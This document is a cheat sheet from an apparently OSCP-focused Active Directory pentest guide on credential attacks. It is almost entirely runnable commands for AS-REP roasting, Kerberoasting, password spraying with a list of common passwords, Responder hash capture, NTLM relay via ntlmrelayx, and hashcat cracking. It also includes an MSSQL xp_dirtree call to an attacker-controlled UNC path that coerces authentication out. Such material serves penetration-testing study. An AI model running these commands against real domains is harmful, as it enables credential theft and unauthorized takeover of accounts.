# 🔑 03 — Credential Attacks

---

## Attack Order

```
1. AS-REP Roasting (no creds — DontReqPreAuth accounts)
2. Password Spray (check lockout policy first — 1 pass per window)
3. Kerberoasting (valid creds required — SPN accounts)
4. Responder (analyze mode on OSCP — capture NetNTLMv2 hashes)
5. ntlmrelayx (SMB signing disabled → relay instead of crack)
6. GPP / SYSVOL (see Phase 02 — cpassword)
```

---

## Environment Setup

```bash
export ip=10.10.10.x
export domain=corp.local
export user=
export pass=
# users.txt built from Phase 02
```

---

## AS-REP Roasting

Targets accounts with **"Do not require Kerberos preauthentication"** set.  
No credentials required — only a username list.

```bash
# NOTE:
# - Copy the AS-REP hash to asrep_hashes.txt
# - Note the SamAccountName for reporting
# - Insert 23 like this → $krb5asrep$23$  (required for hashcat)

# Single user (no creds)
sudo impacket-GetNPUsers $domain/vcreed -dc-ip $ip -no-pass
sudo impacket-GetNPUsers $domain/ -dc-ip $ip
sudo impacket-GetNPUsers $domain/ -dc-ip $ip -request

# Username list
sudo impacket-GetNPUsers $domain/ -usersfile enum/users.txt \
  -format hashcat -outputfile creds/asrep-hashes.txt -dc-ip $ip

# With creds — auto-discover accounts
sudo impacket-GetNPUsers $domain/$user:$pass -request -dc-ip $ip \
  -format hashcat -outputfile creds/asrep-hashes.txt

# Rubeus (on Windows target)
C:\Windows\Tasks> .\Rubeus.exe asreproast
# Transfer hash → insert $krb5asrep$23$ after $krb5asrep$
# Remove whitespace:
cat rawhash.txt | tr -d " \t\n\r" > creds/asrep-hashes.txt

# kerbrute method (validates + roasts in one step)
sudo kerbrute -users ./usernames.txt -dc-ip $ip -domain $domain
```

### Cracking AS-REP Hashes

```bash
# hashcat (mode 18200)
sudo hashcat -m 18200 creds/asrep-hashes.txt /usr/share/wordlists/rockyou.txt \
  -o creds/cracked-asrep.txt

# If rockyou fails — try rules
sudo hashcat -m 18200 creds/asrep-hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule -o creds/cracked-asrep.txt

# john
sudo john --wordlist=/usr/share/wordlists/rockyou.txt creds/asrep-hashes.txt
```

---

## Password Spray

One password across all users. Mind the lockout policy — always check before spraying.

```bash
# kerbrute — Kerberos spray (faster, less noisy)
sudo ./kerbrute passwordspray -d $domain enum/users.txt Password123 --dc $ip

# netexec SMB spray
nxc smb $ip -u enum/users.txt -p 'Password123' --continue-on-success \
  | tee creds/spray-results.txt
grep "\[+\]" creds/spray-results.txt

# Password = username (common misconfiguration)
nxc smb $ip -u enum/users.txt -p enum/users.txt --no-bruteforce \
  --continue-on-success | grep "\[+\]"

# Common passwords to try (one at a time, 30 min between rounds):
# Password123  Welcome1  Company2024!  [CompanyName]123  Summer2024

# ⚠️ Check lockout threshold before starting
# ⚠️ Default safe rule: 1 spray per 30 minutes
# ⚠️ Lockout threshold 0 = no lockout → brute force safe
```

---

## Kerberoasting

Targets service accounts with **Service Principal Names (SPNs)** set.  
Requires valid credentials. Offline cracking — no lockout risk.

```bash
# NOTE:
# - Copy hash to service_hashes.txt
# - Note SamAccountName for reporting

# Find kerberoastable users (Windows — setspn)
C:\Windows\Tasks> setspn -T HOSTNAME -F -Q */*

# Impacket — with credentials
sudo impacket-GetUserSPNs $domain/$user:$pass -dc-ip $ip \
  -request -outputfile creds/kerb-hashes.txt

# No creds (Kerberos-only environments)
sudo impacket-GetUserSPNs $domain/ -k -no-pass -dc-ip $ip -request

# Rubeus (on Windows target)
C:\Windows\Tasks> .\Rubeus.exe kerberoast
# Remove whitespace from hash:
cat rawhash.txt | tr -d " \t\n\r" > creds/kerb-hashes.txt

# Invoke-Kerberoast.ps1 (PowerShell)
PS C:\Windows\Tasks> . .\Invoke-Kerberoast.ps1
PS C:\Windows\Tasks> Invoke-Kerberoast -OutputFormat hashcat | fl
```

### Cracking Kerberoast Hashes

```bash
# hashcat (mode 13100 = RC4 / TGS-REP)
sudo hashcat -m 13100 creds/kerb-hashes.txt /usr/share/wordlists/rockyou.txt \
  -o creds/cracked-kerb.txt

# john
sudo john --wordlist=/usr/share/wordlists/rockyou.txt creds/kerb-hashes.txt

# ⚠️ AES256 hashes (mode 19600) are much slower to crack — note in report
```

---

## Responder — Hash Capture

```bash
# OSCP rule: analyze mode ONLY — no poisoning/spoofing
# Hash stealing using Responder:
sudo responder -I tun0 -A

# Full mode (authorized engagements with written permission only)
sudo responder -I eth0 -wv

# Trigger capture via LFI / SQLi / MSSQL:
# Point any UNC path to your Kali: \\KALI_IP\share
# MSSQL: EXEC xp_dirtree '\\KALI_IP\share'

# Crack captured NetNTLMv2 (mode 5600)
sudo hashcat -m 5600 creds/responder.txt /usr/share/wordlists/rockyou.txt
sudo john creds/responder.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## ntlmrelayx — Relay Hashes (SMB Signing Disabled)

```bash
# Relay instead of cracking (requires SMB signing disabled on target)
# Check: nmap -p 445 --script smb2-security-mode $ip
# Look for: "Message signing enabled but not required"

sudo impacket-ntlmrelayx -t $ip --no-http-server -smb2support
```

---

## NTP / Clock Skew Fix

```bash
# Update time to match DC — avoids Kerberos clock skew errors
sudo ntpdate $ip

# Revert back to system time after engagement
sudo timedatectl set-ntp true
```

---

## Hash Cracking Reference

```bash
# Identify hash type
hashid HASH

# Mode reference
# 1000  = NTLM
# 5600  = NetNTLMv2 (Responder)
# 13100 = Kerberoast RC4 (TGS-REP)
# 18200 = AS-REP Roast
# 19600 = Kerberoast AES256

# Rules-based (better coverage than wordlist alone)
hashcat -m 1000 HASH /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

---

## Checklist

```
[ ] AS-REP roast attempted against full user list
[ ] AS-REP hashes cracked (hashcat -m 18200)
[ ] Password policy checked before spray
[ ] Password spray executed (1 pass per lockout window)
[ ] Kerberoastable SPNs enumerated and listed
[ ] Kerberoast hashes requested and crack attempted (hashcat -m 13100)
[ ] Responder running in analyze mode (-A)
[ ] SYSVOL / GPP checked for cpassword (see Phase 02)
[ ] All new credentials saved to creds/credentials.txt
[ ] NTP sync done if Kerberos clock skew errors appeared
```

---

**MITRE ATT&CK:** T1558.003 (Kerberoasting) · T1558.004 (AS-REP Roasting) · T1110.003 (Password Spraying) · T1557.001 (LLMNR/NBT-NS Poisoning)

[← Domain Enum](../02-domain-enum/README.md) | [Next: Lateral Movement →](../04-lateral-movement/README.md)
